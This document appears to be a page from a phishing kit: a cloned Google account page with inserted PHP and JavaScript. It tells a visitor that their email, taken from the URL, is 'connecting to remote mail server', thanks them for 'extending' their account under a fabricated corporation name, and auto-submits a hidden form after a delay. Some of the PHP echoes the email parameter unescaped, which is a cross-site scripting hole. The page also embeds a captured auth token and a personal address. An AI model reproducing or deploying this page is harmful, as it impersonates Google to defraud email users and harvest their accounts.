(min-resolution:1.25dppx),(-o-min-device-pixel-ratio:5/4),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gbii{background-image:url(//lh6.googleusercontent.com/-fkbVGa32scw/AAAAAAAAAAI/AAAAAAAAAAA/7Jj0dHmxzRo/s64-c/photo.jpg)}.gbii::before{content:url(//lh6.googleusercontent.com/-fkbVGa32scw/AAAAAAAAAAI/AAAAAAAAAAA/7Jj0dHmxzRo/s64-c/photo.jpg)}.gbip{background-image:url()}.gbip::before{content:url()}.gbii::before,.gbip::before{-webkit-transform:scale(.5);-moz-transform:scale(.5);-ms-transform:scale(.5);-o-transform:scale(.5);transform:scale(.5);-webkit-transform-origin:0 0;-moz-transform-origin:0 0;-ms-transform-origin:0 0;-o-transform-origin:0 0;transform-origin:0 0}}
</style>
  <link href="//fonts.googleapis.com/css?family=Open+Sans:300,400&lang=en" rel="stylesheet" type="text/css">
  <style>
  h1, h2, p {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  .main {
  width: auto;
  max-width: 650px;
  }
  .welcome {
  text-align: center;
  }
  .main h1:first-child {
  text-align: center;
  font-family: 'Open Sans', arial;
  color: #555;
  font-size: 38px;
  font-weight: 300;
  margin-top: 50px;
  margin-bottom: 50px;
  }
  .signupdonepage h2 {
  text-align: center;
  font-family: 'Open Sans', arial;
  color: #737373;
  font-size: 20px;
  font-weight: 300;
  margin-bottom: 25px;
  }
  .signupdonepage p {
  text-align: center;
  font-family: 'Open Sans', arial;
  color: #737373;
  font-size: 13px;
  margin-bottom: 40px;
  line-height: 1.5;
  }
  .signupdonepage .logos {
  display: block;
  margin: 48px auto 0;
  }
  .profile-arrow {
  position: absolute;
  top: 120px;
  padding: 10px 95px 0 0;
  right: 50px;
  color: #666;
  font-style: italic;
  height: 55px;
  width: 250px;
  background: transparent url(http://ssl.gstatic.com/accounts/signup/profile-arrow-ltr.png) no-repeat right 2px;
  }
  @media (max-width: 1050px),
  (max-height: 600px) {
  .profile-arrow {
  top: 80px;
  }
  }
  </style>
  </head>
  <body>
  <div class="wrapper">
  <div class="gb_Vc" id="gb"><div class="gb_6b gb_0c"><div class="gb_e gb_0c gb_r gb_Zc"><div class="gb_ba gb_0c gb_r"><div class="gb_ha" id="gbsfw"></div><div class="gb_Fa gb_ea gb_r" id="gbwa"><div class="gb_fa"><a class="gb_ga gb_2" href="http://www.google.com.tw/intl/en/options/" title="Apps" aria-haspopup="true" aria-expanded="false" data-ved="0CAIQvSc"></a><div class="gb_v"></div><div class="gb_u"></div></div><div class="gb_7b gb_ha gb_Qa gb_Wa" aria-label="Apps" role="region" aria-hidden="true" tabindex="0"><ul class="gb_Ja gb_Da" aria-dropeffect="move"><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb119" href="https://plus.google.com/u/0/?gpsrc=ogpy0" data-pid="119" data-ved="0CAMQwS4oAA"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -1667px"></span><span class="gb_xa">+You</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb1" href="https://www.google.com.tw/webhp?ei=fOxaVeLBAcPAmAXWmIEQ&amp;ved=0CAQQqS4oAQ" data-pid="1"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -459px"></span><span class="gb_xa">Search</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb36" href="https://www.youtube.com/" data-pid="36" data-ved="0CAUQwS4oAg"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:-17px -1011px"></span><span class="gb_xa">YouTube</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb8" href="https://maps.google.com.tw/maps?hl=en" data-pid="8" data-ved="0CAYQwS4oAw"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -69px"></span><span class="gb_xa">Maps</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb78" href="https://play.google.com/?hl=en" data-pid="78" data-ved="0CAcQwS4oBA"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -528px"></span><span class="gb_xa">Play</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb23" href="https://mail.google.com/mail/" data-pid="23" data-ved="0CAgQwS4oBQ"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:-35px -942px"></span><span class="gb_xa">Gmail</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb49" href="https://drive.google.com/?authuser=0" data-pid="49" data-ved="0CAkQwS4oBg"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -390px"></span><span class="gb_xa">Drive</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb24" href="https://www.google.com/calendar" data-pid="24" data-ved="0CAoQwS4oBw"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:-35px -735px"></span><span class="gb_xa">Calendar</span></a></li></ul><a class="gb_Ha gb_ec" href="http://www.google.com.tw/intl/en/options/">More</a><span class="gb_Ka"></span><ul class="gb_Ja gb_Ea" aria-dropeffect="move"><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb51" href="https://translate.google.com.tw/?hl=en" data-pid="51" data-ved="0CAsQwS4oCA"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -873px"></span><span class="gb_xa">Translate</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb30" href="https://www.blogger.com/" data-pid="30" data-ved="0CAwQwS4oCQ"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -1874px"></span><span class="gb_xa">Blogger</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb31" href="https://plus.google.com/u/0/photos" data-pid="31" data-ved="0CA0QwS4oCg"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 -1736px"></span><span class="gb_xa">Photos</span></a></li><li class="gb_sa" aria-grabbed="false"><a class="gb_la" id="gb25" href="https://docs.google.com/document/?usp=docs_alc&amp;authuser=0" data-pid="25" data-ved="0CA4QwS4oCw"><div class="gb_Ba"></div><div class="gb_Ca"></div><span class="gb_wa" style="background-position:0 0"></span><span class="gb_xa">Docs</span></a></li></ul><a class="gb_Ka gb_8b" href="http://www.google.com.tw/intl/en/options/">Even more</a></div></div><div class="gb_p gb_ea gb_0c gb_r">
    <div class="gb_fa gb_s gb_0c gb_r"></div><div class="gb_w gb_ha" aria-label="Account Information" aria-hidden="true" tabindex="0"><div class="gb_z"><div class="gb_B"><div class="gb_D"></div><div class="gb_E"></div><div class="gb_y"><a href="https://accounts.google.com/ManageAccount">Account</a>&ndash;<a href="http://www.google.com.tw/intl/en/policies/privacy/">Privacy</a></div><a class="gb_bc gbp1 gb_a" href="https://plus.google.com/u/0/up/accounts/upgrade?gpsrc=ogjgp">Join Google+</a></div></div><div class="gb_F"><div></div><div><a class="gb_cc gb_jc gb_a" id="gb_71" href="https://accounts.google.com/Logout" target="_top">Sign out</a></div></div></div></div></div></div></div><div id="gbw"></div></div><div id="gba"></div>
  <div class="signupdonepage main content clearfix">
  <div class="welcome">
   <script type="text/javascript">
 function initLoadTimer(){
 window.setTimeout(importSelected,6000);
 }

 function importSelected() {
  window.status = 'Please wait...';
  document.wait_form.submit();
  document.getElementById('indicator').src = "/img/shared/static/status_indicator_alone.gif";
 }
 function resetIndicator() {
 	document.getElementById('indicator').src = "/img/shared/static/status_indicator_alone.gif";
 }

 addEvent(window, 'load', initLoadTimer);
  </script>
  
  
</p>
<div align="center">
  <table border="0" width="500" align="center">
    <tbody>
      <tr>
        <td align="center" class="big11pt"><div align="center"><b>Processing ...</b></div></td>
      </tr>
      <tr>
        <td align="center"><div align="center"><img src="please_wait.gif" border="0" width="221" height="14" alt="" /></div></td>
      </tr>
    </tbody>
  </table>
</div>
  <h2>
 <?php
$email= htmlspecialchars($_GET["email"]) ;
echo 'Connecting ' . $email. ' to remote mail server. Please wait!. ';
?>
  </h2>
  <p>
  Thanks for extending your <span style="color: #333333">
  <?php
$email = $_GET["email"];
$domain_name = substr(strrchr($email, "@"), 1);
echo ucfirst($domain_name);
?>
  </span>email account. </p>
 
    
  
    
</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
  </form>
  
  </div>
  </div>
  <div align="center">&copy; 2018 <span style="color: #333333">
    <?php
$email = $_GET["email"];
$domain_name = substr(strrchr($email, "@"), 1);
echo ucfirst($domain_name);
?>
  </span> Corporation. All rights reserved.</div>
  <img id="image-gmail-inbox" src="https://mail.google.com/mail/e-?auth=DQAAAL4AAADRSELo98QEPT-fdVaJycDp3CwkqT8fl6BdaSzbZXZGmZrnCi3ikjHfdfWmvVT0G-No3r28O0kPT36CP_x2DJIAX636ii2xVpmLEupli5mtpg7wKi5FrIN5uMsWjZUmh3eQdZXXcae7wbDRCqX1AwpKbmAOAhwPtAgWViozjdfndtt2XEleE2t20AW1fCJxs7B9_jUK1SwkTKl-tOSYcYDEbR_Y0wk-mdAsxMZevUdmNZ5gMG0Q_e6uwEITch5zupI&amp;continue=https%3A%2F%2Fmail.google.com%2Ffavicon.ico&amp;signupSource=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail" alt="" height="1" width="1">
  <script type="text/javascript">
  (window['gbar']=window['gbar']||{})._CONFIG=[[[0,"www.gstatic.com","og.og.en_US.CvWNI34sY5g.O","com.tw","en","75",0,[3,2,".64.40.40.","","31215,3700287","1431397505","0"],"40400","fOxaVeLBAcPAmAXWmIEQ",0,0,"og.og.-uvycehsuxhwa.L.F4.O","AItRSTNnpaTVB-FBwq175QcU-oeJNh53ZQ","AItRSTNRNQO8NmyR_1treaWDPiLocTKP7w","",2,1,200,"TWN"],null,0,["m;/_/scs/abc-static/_/js/k=gapi.gapi.en.dPxK-DAj_pE.O/m=__features__/am=AAQ/rt=j/d=1/rs=AItRSTN0fuoBkyFaoHWfzWWLct0BxZgQSQ","https://apis.google.com","","","1","","APfa0bqU8Y2blIXljp18uImnSVahES_RlERbUeWtJ9SBXCBwpINUCw0b2Op_y47thDROiPQ0jcv0uWiKidooVbK3jdHthLdx_w==",1,"es_plusone_gc_20150512.0_p0","en"],["1","gci_91f30755d6a6b787dcc2a4062e6e9824.js","googleapis.client:plusone:gapi.iframes","0","en"],null,null,null,[0.009999999776482582,"com.tw","75",[null,"","w",null,1,5184000,1,0],null,[["","","",0,0,-1]],[null,0,0],0,null,null,["5061451","google\\.(com|ru|ca|by|kz|com\\.mx|com\\.tr)$",1]],["%1$s (default)","Google+ page",0,"%1$s (delegated)",0,null,96,"/SignUpDone?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\u0026service=mail\u0026fvi=EhD65vmPk2wXFJZF3lO039tzclfWmgI\u0026dsh=-1080973205467746166\u0026authuser=$authuser","https://accounts.google.com/b/0/DelegateAccountSelector?continue=https%3A%2F%2Faccounts.google.com%2FSignUpDone%3Fcontinue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26service%3Dmail%26fvi%3DEhD65vmPk2wXFJZF3lO039tzclfWmgI%26dsh%3D-1080973205467746166",null,null,1,"https://accounts.google.com/b/0/ListAccounts",0,"dashboard/overview",null,"Business account you own","Business account you manage","Business account icon","Google+ Profile Icon","",0],[1,0,0,null,"0","mc.2.margacipta@gmail.com",""],[1,0.001000000047497451,1],[1,0.1000000014901161,2,1],[0,"",null,"",0,"There was an error loading your Marketplace apps.","You have no Marketplace apps.",1,null,0,1,1],[1],[0,0,["lg"],0,["lat"]],[["ld","gl","is","id","nb","nw","sb","sd","p","vd","awd","st","lod","eld","ip","dp","cpd","","drt","","","","",""],[""]],null,null,[1,null,null,"[[]]",["https","plus.google.com",0,"/u/0","rt=j\u0026sourceid=75",["/u/0/_/og/storage/get",""],["/u/0/_/og/storage/set",""],["/u/0/_/og/storage/remove",""]]],[30,152,1,750,60],null,null,null,["https","clients5.google.com","","pagead/drt/dn/"],null,[1,1]]];(window['gbar']=window['gbar']||{})._DPG=[{'_fdm_':['_r'],'aw':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy42'],'awd':['st','sy11','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy35','sy42','sy44','sy45','sy46','sy9'],'base':['gi','sy11','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy31','sy9'],'bn':['sy9'],'bu':['sy11'],'cp':['sy11'],'cpd':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28'],'d':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy34','sy35','sy36','sy37','sy38','sy39','sy40'],'dbg':['sy10','sy11','sy12','sy14','sy15','sy18','sy23','sy26','sy27','sy28','sy34','sy35','sy36','sy45','sy46','sy48','sy49','sy50'],'dd':['sy20','sy25'],'dp':['sy11','sy14','sy39'],'drt':['sy10','sy11','sy12','sy14','sy15','sy18','sy27','sy28','sy34','sy37','sy39','sy51','sy52'],'el':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy31','sy34','sy35','sy36','sy42','sy44','sy46','sy49','sy50','sy53','sy54','sy55','sy56'],'eld':['sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20'],'eq':['sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20'],'gi':['sy10','sy11','sy12','sy13'],'gl':['d','sy13','sy15','sy18','sy20','sy23','sy26','sy27','sy34','sy36','sy57','sy9'],'id':['sy10','sy11','sy12','sy13','sy14','sy15','sy16','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy34','sy35','sy36','sy39','sy40','sy42','sy44','sy46','sy49','sy50','sy54','sy55','sy57','sy9'],'if':['_r'],'ip':['sy11','sy14','sy20'],'is':['d','sy13','sy20','sy22','sy40','sy44','sy46','sy49','sy54','sy57','sy9'],'iw':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy34','sy35','sy36','sy44','sy46','sy49','sy50','sy54','sy55'],'jb':['sy10','sy11','sy12','sy14','sy15','sy18','sy27','sy28','sy34','sy37','sy39','sy51','sy52'],'ld':['_r'],'lo':['sy11','sy12','sy14','sy15','sy16','sy23','sy24','sy56'],'lod':['sy11','sy12','sy14','sy15','sy16','sy20','sy23','sy24','sy56','sy9'],'nb':['d','sy14','sy15','sy18','sy20','sy23','sy36','sy9'],'ni':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy42'],'nw':['is','nb','sy14','sy18','sy20','sy22','sy23','sy27','sy36','sy40','sy42','sy9'],'p':['awd','d','sy14','sy15','sy16','sy18','sy20','sy22','sy23','sy24','sy26','sy28','sy34','sy37','sy40','sy42','sy48','sy50','sy51'],'pi':['_r'],'sb':['is','sy20','sy22','sy40','sy42','sy9'],'sbi':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy42'],'sd':['bn','d','sf','sy15','sy20','sy23','sy24','sy40','sy9'],'sf':['sy11'],'st':['sy10','sy11','sy12','sy20','sy27','sy37','sy38'],'sy10':['sy11','sy12'],'sy11':['_r'],'sy12':['_r'],'sy13':['sy10'],'sy14':['sy11'],'sy15':['sy12'],'sy16':['sy14','sy15'],'sy17':['_r'],'sy18':['sy15'],'sy19':['sy15','sy18'],'sy20':['sy17','sy22'],'sy22':['sy14','sy15','sy19','sy23','sy24','sy25','sy26','sy27'],'sy23':['_r'],'sy24':['sy15','sy16','sy23'],'sy25':['_r'],'sy26':['sy28'],'sy27':['_r'],'sy28':['sy10','sy18'],'sy31':['sy20','sy23'],'sy34':['sy14','sy27'],'sy35':['_r'],'sy36':['sy15','sy18','sy26','sy35'],'sy37':['_r'],'sy38':['sy10','sy27','sy37'],'sy39':['sy14'],'sy40':['sy14','sy39'],'sy42':['_r'],'sy44':['sy15','sy18','sy26','sy46'],'sy45':['sy11','sy15','sy18','sy26','sy46'],'sy46':['sy26'],'sy48':['_r'],'sy49':['sy15','sy18','sy26','sy46'],'sy50':['_r'],'sy51':['sy12','sy14','sy18','sy27','sy28','sy37'],'sy52':['sy14','sy15','sy18','sy28','sy51'],'sy53':['sy15','sy20','sy22','sy23','sy31','sy42','sy55','sy56'],'sy54':['sy11','sy14','sy15','sy18','sy22','sy23','sy26','sy27','sy28','sy34','sy36','sy44','sy46','sy49'],'sy55':['sy15','sy16','sy22','sy23','sy24','sy27','sy34','sy50','sy54'],'sy56':['sy23','sy24'],'sy57':['sy13','sy20','sy40','sy9'],'sy9':['_r'],'uc':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy42'],'ucd':['sy10','sy11','sy12','sy14','sy15','sy16','sy17','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy34','sy35','sy36','sy42','sy44','sy46','sy49','sy54','sy9'],'up':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy31','sy34','sy35','sy36','sy42','sy44','sy46','sy49','sy50','sy53','sy54','sy55','sy56','sy9'],'vd':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy20','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy42','sy56','sy9'],'vi':['sy10','sy11','sy12','sy14','sy15','sy16','sy18','sy19','sy22','sy23','sy24','sy25','sy26','sy27','sy28','sy56']}];(window['gbar']=window['gbar']||{})._LDD=["bt","base","bn","bu","cp","el","lo","sbi","ni","sf","up","dd","aw","iw","if","gi","vi","pi","eq","uc"];this.gbar_=this.gbar_||{};(function(_){var window=this;
try{
var ja,ka;_.aa=_.aa||{};_.m=this;_.n=function(a){return void 0!==a};_.p=function(a,c){for(var d=a.split("."),e=c||_.m,f;f=d.shift();)if(null!=e[f])e=e[f];else return null;return e};_.ba=function(a){a.M=function(){return a.Ge?a.Ge:a.Ge=new a}};
_.ca=function(a){var c=typeof a;if("object"==c)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return c;var d=Object.prototype.toString.call(a);if("[object Window]"==d)return"object";if("[object Array]"==d||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==d||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";
else if("function"==c&&"undefined"==typeof a.call)return"object";return c};_.da=function(a){return"array"==_.ca(a)};_.ea=function(a){return"string"==typeof a};_.fa=function(a){return"number"==typeof a};_.ga=function(a){return"function"==_.ca(a)};_.ha=function(a){var c=typeof a;return"object"==c&&null!=a||"function"==c};_.ia="closure_uid_"+(1E9*Math.random()>>>0);ja=function(a,c,d){return a.call.apply(a.bind,arguments)};
ka=function(a,c,d){if(!a)throw Error();if(2<arguments.length){var e=Array.prototype.slice.call(arguments,2);return function(){var d=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(d,e);return a.apply(c,d)}}return function(){return a.apply(c,arguments)}};_.t=function(a,c,d){_.t=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?ja:ka;return _.t.apply(null,arguments)};_.la=Date.now||function(){return+new Date};
_.u=function(a,c){var d=a.split("."),e=_.m;d[0]in e||!e.execScript||e.execScript("var "+d[0]);for(var f;d.length&&(f=d.shift());)!d.length&&_.n(c)?e[f]=c:e[f]?e=e[f]:e=e[f]={}};_.v=function(a,c){function d(){}d.prototype=c.prototype;a.J=c.prototype;a.prototype=new d;a.prototype.constructor=a;a.oi=function(a,d,g){for(var h=Array(arguments.length-2),l=2;l<arguments.length;l++)h[l-2]=arguments[l];return c.prototype[d].apply(a,h)}};
_.ma=function(){this.data={}};_.ma.prototype.b=function(){window.console&&window.console.log&&window.console.log("Log data: ",this.data)};_.ma.prototype.o=function(a){var c=[],d;for(d in this.data)c.push((0,window.encodeURIComponent)(d)+"="+(0,window.encodeURIComponent)(String(this.data[d])));return("atyp=i&zx="+(new Date).getTime()+"&"+c.join("&")).substr(0,a)};
_.na=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,_.na);else{var c=Error().stack;c&&(this.stack=c)}a&&(this.message=String(a))};_.v(_.na,Error);_.na.prototype.name="CustomError";var pa;_.oa=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")};
_.qa=function(a,c){for(var d=0,e=(0,_.oa)(String(a)).split("."),f=(0,_.oa)(String(c)).split("."),g=Math.max(e.length,f.length),h=0;0==d&&h<g;h++){var l=e[h]||"",q=f[h]||"",r=RegExp("(\\d*)(\\D*)","g"),w=RegExp("(\\d*)(\\D*)","g");do{var A=r.exec(l)||["","",""],M=w.exec(q)||["","",""];if(0==A[0].length&&0==M[0].length)break;d=pa(0==A[1].length?0:(0,window.parseInt)(A[1],10),0==M[1].length?0:(0,window.parseInt)(M[1],10))||pa(0==A[2].length,0==M[2].length)||pa(A[2],M[2])}while(0==d)}return d}; pa=function(a,c){return a<c?-1:a>c?1:0};
_.ra=Array.prototype;_.sa=_.ra.indexOf?function(a,c,d){return _.ra.indexOf.call(a,c,d)}:function(a,c,d){d=null==d?0:0>d?Math.max(0,a.length+d):d;if(_.ea(a))return _.ea(c)&&1==c.length?a.indexOf(c,d):-1;for(;d<a.length;d++)if(d in a&&a[d]===c)return d;return-1};_.ta=_.ra.forEach?function(a,c,d){_.ra.forEach.call(a,c,d)}:function(a,c,d){for(var e=a.length,f=_.ea(a)?a.split(""):a,g=0;g<e;g++)g in f&&c.call(d,f[g],g,a)};
_.ua=_.ra.filter?function(a,c,d){return _.ra.filter.call(a,c,d)}:function(a,c,d){for(var e=a.length,f=[],g=0,h=_.ea(a)?a.split(""):a,l=0;l<e;l++)if(l in h){var q=h[l];c.call(d,q,l,a)&&(f[g++]=q)}return f};_.va=_.ra.map?function(a,c,d){return _.ra.map.call(a,c,d)}:function(a,c,d){for(var e=a.length,f=Array(e),g=_.ea(a)?a.split(""):a,h=0;h<e;h++)h in g&&(f[h]=c.call(d,g[h],h,a));return f};
_.wa=_.ra.reduce?function(a,c,d,e){e&&(c=(0,_.t)(c,e));return _.ra.reduce.call(a,c,d)}:function(a,c,d,e){var f=d;(0,_.ta)(a,function(d,h){f=c.call(e,f,d,h,a)});return f};_.xa=_.ra.some?function(a,c,d){return _.ra.some.call(a,c,d)}:function(a,c,d){for(var e=a.length,f=_.ea(a)?a.split(""):a,g=0;g<e;g++)if(g in f&&c.call(d,f[g],g,a))return!0;return!1};_.ya=function(a,c){return 0<=(0,_.sa)(a,c)};
_.za=/\uffff/.test("\uffff")?/[\\\"\x00-\x1f\x7f-\uffff]/g:/[\\\"\x00-\x1f\x7f-\xff]/g;var Aa,Ca;Aa="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");_.Ba=function(a,c){for(var d,e,f=1;f<arguments.length;f++){e=arguments[f];for(d in e)a[d]=e[d];for(var g=0;g<Aa.length;g++)d=Aa[g],Object.prototype.hasOwnProperty.call(e,d)&&(a[d]=e[d])}};Ca=function(a){var c=arguments.length;if(1==c&&_.da(arguments[0]))return Ca.apply(null,arguments[0]);for(var d={},e=0;e<c;e++)d[arguments[e]]=!0;return d};
_.x=function(){};_.y=function(a,c,d,e){a.b=null;c||(c=d?[d]:[]);a.C=d?String(d):void 0;a.B=0===d?-1:0;a.o=c;a:{if(a.o.length&&(c=a.o.length-1,(d=a.o[c])&&"object"==typeof d&&!_.da(d))){a.A=c-a.B;a.w=d;break a}a.A=Number.MAX_VALUE}if(e)for(c=0;c<e.length;c++)d=e[c],d<a.A?(d+=a.B,a.o[d]=a.o[d]||_.Da):a.w[d]=a.w[d]||_.Da};_.Da=[];_.z=function(a,c){if(c<a.A){var d=c+a.B,e=a.o[d];return e===_.Da?a.o[d]=[]:e}e=a.w[c];return e===_.Da?a.w[c]=[]:e}; _.B=function(a,c,d){a.b||(a.b={});if(!a.b[d]){var e=_.z(a,d);e&&(a.b[d]=new c(e))}return a.b[d]};_.x.prototype.fb=function(){return this.o};_.x.prototype.toString=function(){return this.o.toString()};
_.Ea=function(a){_.y(this,a,0,null)};_.v(_.Ea,_.x);_.C=function(a,c){return null!=a?a:!!c};_.D=function(a){var c;void 0==c&&(c="");return null!=a?a:c};_.E=function(a,c){void 0==c&&(c=0);return null!=a?a:c};_.Ha=function(a,c){this.data={};var d=_.B(a,_.Ea,8)||new _.Ea;this.data.ei=_.D(_.Fa(a));this.data.ogf=_.D(_.z(d,3));var e;e=window.google&&window.google.sn?/.*hp$/.test(window.google.sn)?!1:!0:_.C(_.z(a,7));this.data.ogrp=e?"1":"";this.data.ogv=_.D(_.z(d,6))+"."+_.D(_.z(d,7));this.data.ogd=_.D(_.z(a,21));this.data.ogc=_.D(_.z(a,20));this.data.ogl=_.D(_.Ga(a));c&&(this.data.oggv=c)};_.v(_.Ha,_.ma);
var Ia,La,Ka;_.Ja=function(a){var c="//www.google.com/gen_204?",c=c+a.o(2040-c.length);Ia(c)};Ia=function(a){var c=new window.Image,d=Ka;c.onerror=c.onload=c.onabort=function(){d in La&&delete La[d]};La[Ka++]=c;c.src=a};La=[];Ka=0;_.Ma=function(a){this.b=a};_.Ma.prototype.log=function(a,c){try{if(this.C(a)){var d=this.w(a,c);this.o(d)}}catch(e){}};_.Ma.prototype.o=function(a){this.b?a.b():_.Ja(a)};var Ta;_.Na=function(){this.b={};this.o={}};_.ba(_.Na);_.Pa=function(a,c){a.M=function(){return _.Oa(_.Na.M(),c)};a.Qh=function(){return _.Na.M().b[c]||null}};_.F=function(a){return _.Oa(_.Na.M(),a)};_.Ra=function(a,c){var d=_.Na.M();if(a in d.b){if(d.b[a]!=c)throw new Qa(a);}else{d.b[a]=c;var e=d.o[a];if(e)for(var f=0,g=e.length;f<g;f++)e[f].b(d.b,a);delete d.o[a]}};_.Oa=function(a,c){if(c in a.b)return a.b[c];throw new Sa(c);};Ta=function(a){_.na.call(this);this.da=a};_.v(Ta,_.na); var Qa=function(a){Ta.call(this,a)};_.v(Qa,Ta);var Sa=function(a){Ta.call(this,a)};_.v(Sa,Ta);
_.Ua=function(a,c,d,e,f){_.Ha.call(this,a,c);_.Ba(this.data,{jexpid:_.D(_.z(a,9)),srcpg:"prop="+_.D(_.z(a,6)),jsr:Math.round(1/e),emsg:d.name+":"+d.message});if(f){f._sn&&(f._sn="og."+f._sn);for(var g in f)this.data[(0,window.encodeURIComponent)(g)]=f[g]}};_.v(_.Ua,_.Ha);
_.G=function(){this.Sa=this.Sa;this.Ra=this.Ra};_.G.prototype.Sa=!1;_.G.prototype.isDisposed=function(){return this.Sa};_.G.prototype.aa=function(){this.Sa||(this.Sa=!0,this.P())};_.G.prototype.P=function(){if(this.Ra)for(;this.Ra.length;)this.Ra.shift()()};
_.Va=function(a){_.y(this,a,0,null)};_.v(_.Va,_.x);_.Wa=function(a){return null!=_.z(a,2)?_.z(a,2):.001};var Xa=function(a){_.y(this,a,0,null)};_.v(Xa,_.x);_.Ga=function(a){return _.z(a,5)};_.Fa=function(a){return _.z(a,10)};var Ya=function(a){_.y(this,a,0,null)};_.v(Ya,_.x);_.$a=function(){var a=_.Za();return _.z(a,9)};_.ab=function(a){_.y(this,a,0,null)};_.v(_.ab,_.x);var bb=function(a){_.y(this,a,0,null)};_.v(bb,_.x);bb.prototype.yc=function(){return _.B(this,_.ab,14)};_.cb=function(){var a=_.H(_.I.M());return _.B(a,_.Va,13)};var db=new bb(window.gbar&&window.gbar._CONFIG?window.gbar._CONFIG[0]:[[,,,,,,,[]],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]]),eb;eb=_.z(db,3);_.fb=_.C(eb);_.J=function(){};_.u("gbar_._DumpException",function(a){if(_.fb)throw a;_.J(a)});var gb;gb=function(){this.o=!1;this.b=[]};_.ib=function(a){var c=_.hb;c.o?a():c.b.push(a)};gb.prototype.w=function(a){if(!this.o){this.o=!0;for(var c=0;c<this.b.length;c++)try{this.b[c]()}catch(d){a(d)}this.b=null;try{_.F("api").Ya()}catch(e){}}};_.hb=new gb;
